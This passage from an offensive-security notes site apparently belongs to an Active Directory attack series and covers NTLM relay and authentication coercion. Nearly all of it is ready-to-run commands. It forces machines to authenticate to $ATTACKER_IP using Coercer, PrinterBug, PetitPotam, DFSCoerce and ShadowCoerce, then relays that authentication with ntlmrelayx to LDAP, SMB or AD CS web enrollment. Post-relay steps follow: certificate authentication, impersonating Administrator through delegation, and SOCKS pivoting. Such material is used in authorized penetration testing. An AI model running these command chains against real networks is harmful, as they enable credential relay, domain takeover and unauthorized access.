+<div class="language-bash highlight"><pre><span></span><code><span id="__span-93-1"><a id="__codelineno-93-1" name="__codelineno-93-1" href="#__codelineno-93-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Use hash if supported:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-94-1"><a id="__codelineno-94-1" name="__codelineno-94-1" href="#__codelineno-94-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-H<span class="w"> </span><span class="nv">$NTLM</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Scan multiple targets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-95-1"><a id="__codelineno-95-1" name="__codelineno-95-1" href="#__codelineno-95-1"></a>coercer<span class="w"> </span>scan<span class="w"> </span>-f<span class="w"> </span>targets.txt<span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Coerce multiple targets:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-96-1"><a id="__codelineno-96-1" name="__codelineno-96-1" href="#__codelineno-96-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-f<span class="w"> </span>targets.txt<span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Start relay first:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-97-1"><a id="__codelineno-97-1" name="__codelineno-97-1" href="#__codelineno-97-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>Then trigger Coercer:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-98-1"><a id="__codelineno-98-1" name="__codelineno-98-1" href="#__codelineno-98-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Use with AD CS relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-99-1"><a id="__codelineno-99-1" name="__codelineno-99-1" href="#__codelineno-99-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span><span id="__span-99-2"><a id="__codelineno-99-2" name="__codelineno-99-2" href="#__codelineno-99-2"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Coercer output to save:</p>
+<table>
+<thead>
+<tr>
+<th>Output</th>
+<th>Why it matters</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Working method</td>
+<td>Exact coercion primitive.</td>
+</tr>
+<tr>
+<td>RPC interface</td>
+<td>Protocol context.</td>
+</tr>
+<tr>
+<td>Auth received</td>
+<td>Confirms coercion.</td>
+</tr>
+<tr>
+<td>Failed methods</td>
+<td>Avoid retrying noisy methods.</td>
+</tr>
+<tr>
+<td>Target identity</td>
+<td>Machine account or user.</td>
+</tr>
+</tbody>
+</table>
+<p>Common workflow:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-100-1"><a id="__codelineno-100-1" name="__codelineno-100-1" href="#__codelineno-100-1"></a>1. Identify relay target.
+</span><span id="__span-100-2"><a id="__codelineno-100-2" name="__codelineno-100-2" href="#__codelineno-100-2"></a>2. Start ntlmrelayx.
+</span><span id="__span-100-3"><a id="__codelineno-100-3" name="__codelineno-100-3" href="#__codelineno-100-3"></a>3. Run Coercer against victim.
+</span><span id="__span-100-4"><a id="__codelineno-100-4" name="__codelineno-100-4" href="#__codelineno-100-4"></a>4. Watch for authentication.
+</span><span id="__span-100-5"><a id="__codelineno-100-5" name="__codelineno-100-5" href="#__codelineno-100-5"></a>5. Check relay result.
+</span><span id="__span-100-6"><a id="__codelineno-100-6" name="__codelineno-100-6" href="#__codelineno-100-6"></a>6. Save working method and output.
+</span></code></pre></div>
+<hr />
+<h2 id="relay-checklist">Relay Checklist</h2>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Basic context</strong></li>
+</ul>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-101-1"><a id="__codelineno-101-1" name="__codelineno-101-1" href="#__codelineno-101-1"></a>Domain:
+</span><span id="__span-101-2"><a id="__codelineno-101-2" name="__codelineno-101-2" href="#__codelineno-101-2"></a>DC:
+</span><span id="__span-101-3"><a id="__codelineno-101-3" name="__codelineno-101-3" href="#__codelineno-101-3"></a>CA server:
+</span><span id="__span-101-4"><a id="__codelineno-101-4" name="__codelineno-101-4" href="#__codelineno-101-4"></a>Attacker IP:
+</span><span id="__span-101-5"><a id="__codelineno-101-5" name="__codelineno-101-5" href="#__codelineno-101-5"></a>Target range:
+</span><span id="__span-101-6"><a id="__codelineno-101-6" name="__codelineno-101-6" href="#__codelineno-101-6"></a>Current credential:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Identify relayable SMB targets</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-102-1"><a id="__codelineno-102-1" name="__codelineno-102-1" href="#__codelineno-102-1"></a>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$RANGE</span><span class="w"> </span>--gen-relay-list<span class="w"> </span>relay_targets.txt
+</span><span id="__span-102-2"><a id="__codelineno-102-2" name="__codelineno-102-2" href="#__codelineno-102-2"></a>cat<span class="w"> </span>relay_targets.txt
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-103-1"><a id="__codelineno-103-1" name="__codelineno-103-1" href="#__codelineno-103-1"></a>SMB signing not required:
+</span><span id="__span-103-2"><a id="__codelineno-103-2" name="__codelineno-103-2" href="#__codelineno-103-2"></a>Potential SMB relay targets:
+</span><span id="__span-103-3"><a id="__codelineno-103-3" name="__codelineno-103-3" href="#__codelineno-103-3"></a>High-value hosts:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Identify LDAP / LDAPS target</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-104-1"><a id="__codelineno-104-1" name="__codelineno-104-1" href="#__codelineno-104-1"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-105-1"><a id="__codelineno-105-1" name="__codelineno-105-1" href="#__codelineno-105-1"></a>LDAP:
+</span><span id="__span-105-2"><a id="__codelineno-105-2" name="__codelineno-105-2" href="#__codelineno-105-2"></a>LDAPS:
+</span><span id="__span-105-3"><a id="__codelineno-105-3" name="__codelineno-105-3" href="#__codelineno-105-3"></a>Signing/channel binding notes:
+</span><span id="__span-105-4"><a id="__codelineno-105-4" name="__codelineno-105-4" href="#__codelineno-105-4"></a>MachineAccountQuota:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Identify AD CS</strong></li>
+</ul>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-106-1"><a id="__codelineno-106-1" name="__codelineno-106-1" href="#__codelineno-106-1"></a>certipy<span class="w"> </span>find<span class="w"> </span>-u<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$USER</span><span class="s2">@</span><span class="nv">$DOMAIN</span><span class="s2">&quot;</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-vulnerable
+</span><span id="__span-106-2"><a id="__codelineno-106-2" name="__codelineno-106-2" href="#__codelineno-106-2"></a>nxc<span class="w"> </span>ldap<span class="w"> </span><span class="nv">$DC_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-M<span class="w"> </span>adcs
+</span></code></pre></div>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-107-1"><a id="__codelineno-107-1" name="__codelineno-107-1" href="#__codelineno-107-1"></a>CA:
+</span><span id="__span-107-2"><a id="__codelineno-107-2" name="__codelineno-107-2" href="#__codelineno-107-2"></a>HTTP endpoint:
+</span><span id="__span-107-3"><a id="__codelineno-107-3" name="__codelineno-107-3" href="#__codelineno-107-3"></a>Templates:
+</span><span id="__span-107-4"><a id="__codelineno-107-4" name="__codelineno-107-4" href="#__codelineno-107-4"></a>ESC8-like path:
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Start relay listener</strong></li>
+</ul>
+<p>SMB relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-108-1"><a id="__codelineno-108-1" name="__codelineno-108-1" href="#__codelineno-108-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>LDAP relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-109-1"><a id="__codelineno-109-1" name="__codelineno-109-1" href="#__codelineno-109-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>ldap://<span class="nv">$DC_IP</span><span class="w"> </span>--smb2support<span class="w"> </span>--delegate-access
+</span></code></pre></div>
+<p>AD CS relay:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-110-1"><a id="__codelineno-110-1" name="__codelineno-110-1" href="#__codelineno-110-1"></a>ntlmrelayx.py<span class="w"> </span>-t<span class="w"> </span>http://ca01.corp.local/certsrv/certfnsh.asp<span class="w"> </span>--adcs<span class="w"> </span>--template<span class="w"> </span>Machine<span class="w"> </span>--smb2support
+</span></code></pre></div>
+<p>SOCKS:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-111-1"><a id="__codelineno-111-1" name="__codelineno-111-1" href="#__codelineno-111-1"></a>ntlmrelayx.py<span class="w"> </span>-tf<span class="w"> </span>relay_targets.txt<span class="w"> </span>--smb2support<span class="w"> </span>-socks
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Trigger coercion</strong></li>
+</ul>
+<p>PrinterBug:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-112-1"><a id="__codelineno-112-1" name="__codelineno-112-1" href="#__codelineno-112-1"></a>printerbug.py<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$DOMAIN</span><span class="s2">/</span><span class="nv">$USER</span><span class="s2">:</span><span class="nv">$PASS</span><span class="s2">@</span><span class="nv">$TARGET</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>PetitPotam:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-113-1"><a id="__codelineno-113-1" name="__codelineno-113-1" href="#__codelineno-113-1"></a>python3<span class="w"> </span>PetitPotam.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span><span class="nv">$TARGET</span>
+</span></code></pre></div>
+<p>DFSCoerce:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-114-1"><a id="__codelineno-114-1" name="__codelineno-114-1" href="#__codelineno-114-1"></a>python3<span class="w"> </span>dfscoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>ShadowCoerce:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-115-1"><a id="__codelineno-115-1" name="__codelineno-115-1" href="#__codelineno-115-1"></a>python3<span class="w"> </span>shadowcoerce.py<span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span><span class="nv">$ATTACKER_IP</span>
+</span></code></pre></div>
+<p>Coercer:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-116-1"><a id="__codelineno-116-1" name="__codelineno-116-1" href="#__codelineno-116-1"></a>coercer<span class="w"> </span>coerce<span class="w"> </span>-t<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-l<span class="w"> </span><span class="nv">$ATTACKER_IP</span><span class="w"> </span>-u<span class="w"> </span><span class="nv">$USER</span><span class="w"> </span>-p<span class="w"> </span><span class="s2">&quot;</span><span class="nv">$PASS</span><span class="s2">&quot;</span><span class="w"> </span>-d<span class="w"> </span><span class="nv">$DOMAIN</span>
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm incoming identity</strong></li>
+</ul>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-117-1"><a id="__codelineno-117-1" name="__codelineno-117-1" href="#__codelineno-117-1"></a>Incoming identity:
+</span><span id="__span-117-2"><a id="__codelineno-117-2" name="__codelineno-117-2" href="#__codelineno-117-2"></a>Source host:
+</span><span id="__span-117-3"><a id="__codelineno-117-3" name="__codelineno-117-3" href="#__codelineno-117-3"></a>Protocol:
+</span><span id="__span-117-4"><a id="__codelineno-117-4" name="__codelineno-117-4" href="#__codelineno-117-4"></a>Timestamp:
+</span><span id="__span-117-5"><a id="__codelineno-117-5" name="__codelineno-117-5" href="#__codelineno-117-5"></a>Coercion method:
+</span></code></pre></div>
+<p>Expected examples:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-118-1"><a id="__codelineno-118-1" name="__codelineno-118-1" href="#__codelineno-118-1"></a>DC01$
+</span><span id="__span-118-2"><a id="__codelineno-118-2" name="__codelineno-118-2" href="#__codelineno-118-2"></a>FILESERV01$
+</span><span id="__span-118-3"><a id="__codelineno-118-3" name="__codelineno-118-3" href="#__codelineno-118-3"></a>WEB01$
+</span><span id="__span-118-4"><a id="__codelineno-118-4" name="__codelineno-118-4" href="#__codelineno-118-4"></a>CORP\alice
+</span></code></pre></div>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Confirm relay result</strong></li>
+</ul>
+<p>Record:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-119-1"><a id="__codelineno-119-1" name="__codelineno-119-1" href="#__codelineno-119-1"></a>Relay target:
+</span><span id="__span-119-2"><a id="__codelineno-119-2" name="__codelineno-119-2" href="#__codelineno-119-2"></a>Relay protocol:
+</span><span id="__span-119-3"><a id="__codelineno-119-3" name="__codelineno-119-3" href="#__codelineno-119-3"></a>Action:
+</span><span id="__span-119-4"><a id="__codelineno-119-4" name="__codelineno-119-4" href="#__codelineno-119-4"></a>Success:
+</span><span id="__span-119-5"><a id="__codelineno-119-5" name="__codelineno-119-5" href="#__codelineno-119-5"></a>Error:
+</span><span id="__span-119-6"><a id="__codelineno-119-6" name="__codelineno-119-6" href="#__codelineno-119-6"></a>Output:
+</span></code></pre></div>
+<p>Common results:</p>
+<table>
+<thead>
+<tr>
+<th>Result</th>
+<th>Meaning</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Auth received but no relay</td>
+<td>Listener or target configuration issue.</td>
+</tr>
+<tr>
+<td>Relay blocked by signing</td>
+<td>Target requires signing.</td>
+</tr>
+<tr>
+<td>LDAP action failed</td>
+<td>Insufficient rights or protections.</td>
+</tr>
+<tr>
+<td>Certificate issued</td>
+<td>AD CS relay success.</td>
+</tr>
+<tr>
+<td>Session created</td>
+<td>Use interactive or SOCKS path.</td>
+</tr>
+<tr>
+<td>Command executed</td>
+<td>Relayed identity had local admin on SMB target.</td>
+</tr>
+</tbody>
+</table>
+<ul class="task-list">
+<li class="task-list-item"><label class="task-list-control"><input type="checkbox"/><span class="task-list-indicator"></span></label> <strong>Post-relay actions</strong></li>
+</ul>
+<p>If AD CS certificate obtained:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-120-1"><a id="__codelineno-120-1" name="__codelineno-120-1" href="#__codelineno-120-1"></a>certipy<span class="w"> </span>auth<span class="w"> </span>-pfx<span class="w"> </span>machine.pfx<span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span></code></pre></div>
+<p>If RBCD set:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-121-1"><a id="__codelineno-121-1" name="__codelineno-121-1" href="#__codelineno-121-1"></a>getST.py<span class="w"> </span>-spn<span class="w"> </span>cifs/<span class="nv">$TARGET_HOST</span><span class="w"> </span>-impersonate<span class="w"> </span>Administrator<span class="w"> </span><span class="nv">$DOMAIN</span>/<span class="s1">&#39;ATTACKBOX$&#39;</span>:<span class="s1">&#39;MachinePass123!&#39;</span><span class="w"> </span>-dc-ip<span class="w"> </span><span class="nv">$DC_IP</span>
+</span><span id="__span-121-2"><a id="__codelineno-121-2" name="__codelineno-121-2" href="#__codelineno-121-2"></a><span class="nb">export</span><span class="w"> </span><span class="nv">KRB5CCNAME</span><span class="o">=</span><span class="nv">$PWD</span>/Administrator.ccache
+</span></code></pre></div>
+<p>If SOCKS session exists:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-122-1"><a id="__codelineno-122-1" name="__codelineno-122-1" href="#__codelineno-122-1"></a>proxychains<span class="w"> </span>nxc<span class="w"> </span>smb<span class="w"> </span><span class="nv">$TARGET</span><span class="w"> </span>-u<span class="w"> </span>relayed<span class="w"> </span>-p<span class="w"> </span><span class="s1">&#39;&#39;</span>
+</span></code></pre></div>
+<p>If SMB command execution worked:</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-123-1"><a id="__codelineno-123-1" name="__codelineno-123-1" href="#__codelineno-123-1"></a>Save command output and identify resulting access.
+</span></code></pre></div>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+    
+      
+      <nav class="md-footer__inner md-grid" aria-label="Footer" >
+        
+          
+          <a href="../Kerberos_Attacks/" class="md-footer__link md-footer__link--prev" aria-label="Previous: Kerberos Attacks">
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+            </div>
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Previous
+              </span>
+              <div class="md-ellipsis">
+                Kerberos Attacks
+              </div>
+            </div>
+          </a>
+        
+        
+          
+          <a href="../ACL_Abuse/" class="md-footer__link md-footer__link--next" aria-label="Next: ACL Abuse">
+            <div class="md-footer__title">
+              <span class="md-footer__direction">
+                Next
+              </span>
+              <div class="md-ellipsis">
+                ACL Abuse
+              </div>
+            </div>
+            <div class="md-footer__button md-icon">
+              
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      
+      <script id="__config" type="application/json">{"annotate": null, "base": "../..", "features": ["navigation.sections", "toc.integrate", "toc.follow", "navigation.tracking", "content.code.copy", "content.code.annotate", "navigation.top", "navigation.footer", "search.suggest", "search.highlight"], "search": "../../assets/javascripts/workers/search.2c215733.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.79ae519e.min.js"></script>
+      
+        <script src="../../javascripts/runaway-bat.js"></script>
+      
+        <script src="../../javascripts/sidebar-follow-active.js"></script>
+      
+        <script src="../../javascripts/page-up.js"></script>
+      
+        <script src="../../javascripts/checklist-state.js"></script>
+      
+    
+  </body>
+</html>
